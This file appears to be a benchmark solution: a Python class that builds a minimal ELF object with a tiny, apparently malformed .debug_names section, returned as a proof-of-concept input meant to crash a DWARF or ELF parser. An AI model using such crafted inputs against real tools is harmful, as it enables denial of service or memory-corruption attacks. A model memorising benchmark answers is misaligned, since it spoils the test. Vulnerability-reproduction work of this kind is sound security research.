import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        debug_names = struct.pack('<I', 10) + b'\x05\x00\x00\x00\x01\x08\x08\x00\x01\x00'
        D = len(debug_names)
        shstrtab = b'\x00.debug_names\x00.shstrtab\x00'
        sh_offset = 64 + D + 24
        e_ident = b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        e_type = struct.pack('<H', 1)
        e_machine = struct.pack('<H', 62)
        e_version = struct.pack('<I', 1)
        e_entry = struct.pack('<Q', 0)
        e_phoff = struct.pack('<Q', 0)
        e_shoff = struct.pack('<Q', sh_offset)
        e_flags = struct.pack('<I', 0)
        e_ehsize = struct.pack('<H', 64)
        e_phentsize = struct.pack('<H', 0)
        e_phnum = struct.pack('<H', 0)
        e_shentsize = struct.pack('<H', 64)
        e_shnum = struct.pack('<H', 3)
        e_shstrndx = struct.pack('<H', 2)
        elf_header = e_ident + e_type + e_machine + e_version + e_entry + e_phoff + e_shoff + e_flags + e_ehsize + e_phentsize + e_phnum + e_shentsize + e_shnum + e_shstrndx
        sh0 = b'\x00' * 64
        sh1_name = 1
        sh1_type = 1
        sh1_flags = 0
        sh1_addr = 0
        sh1_offset = 64
        sh1_size = D
        sh1_link = 0
        sh1_info = 0
        sh1_addralign = 1
        sh1_entsize = 0
        sh1 = struct.pack('<I', sh1_name) + struct.pack('<I', sh1_type) + struct.pack('<Q', sh1_flags) + struct.pack('<Q', sh1_addr) + struct.pack('<Q', sh1_offset) + struct.pack('<Q', sh1_size) + struct.pack('<I', sh1_link) + struct.pack('<I', sh1_info) + struct.pack('<I', sh1_addralign) + struct.pack('<Q', sh1_entsize)
        sh2_name = 14
        sh2_type = 3
        sh2_flags = 0
        sh2_addr = 0
        sh2_offset = 64 + D
        sh2_size = 24
        sh2_link = 0
        sh2_info = 0
        sh2_addralign = 1
        sh2_entsize = 0
        sh2 = struct.pack('<I', sh2_name) + struct.pack('<I', sh2_type) + struct.pack('<Q', sh2_flags) + struct.pack('<Q', sh2_addr) + struct.pack('<Q', sh2_offset) + struct.pack('<Q', sh2_size) + struct.pack('<I', sh2_link) + struct.pack('<I', sh2_info) + struct.pack('<I', sh2_addralign) + struct.pack('<Q', sh2_entsize)
        poc = elf_header + debug_names + shstrtab + sh0 + sh1 + sh2
        return poc
